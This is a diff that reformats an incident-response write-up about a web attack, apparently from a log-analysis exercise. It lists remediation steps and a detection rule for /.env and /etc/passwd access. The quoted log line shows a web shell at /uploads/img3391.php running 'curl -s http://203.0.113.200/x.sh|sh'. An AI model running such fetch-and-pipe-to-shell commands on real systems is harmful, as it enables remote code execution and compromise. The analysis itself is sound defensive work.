@@ -83,6 +83,8 @@ Yes the attack worked. This was possible from 203.0.113.171 attack from admin lo
 
 -	Secure and recover: Patch the exploit and rotate exposed credentials and application secrets. Also check account privileges and disables unnecessary privileges.
 
-### Detection idea: Set a rule that detects suspicious encoded URL patterns that stops sensitive file access like get to /.env and /etc/passwd. Also rule that stops malicious file upload, remote command execution (RCE).
+### Detection idea: 
+- Set a rule that detects suspicious encoded URL patterns that stops sensitive file access like get to /.env and /etc/passwd. Also rule that stops malicious file upload, remote command execution (RCE).
 
-### Bonus: The attacker made eight GET requests and out of the eight requests this line (04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0) shows they could run commands on the server.
+### Bonus: 
+- The attacker made eight GET requests and out of the eight requests this line (04:52:30 203.0.113.171 - 𝐺𝐸𝑇 /𝑢𝑝𝑙𝑜𝑎𝑑𝑠/𝑖𝑚𝑔3391.php?c=curl%20-s%20http://203.0.113.200/x.sh%7Csh 200 0 python-requests/2.31.0) shows they could run commands on the server.
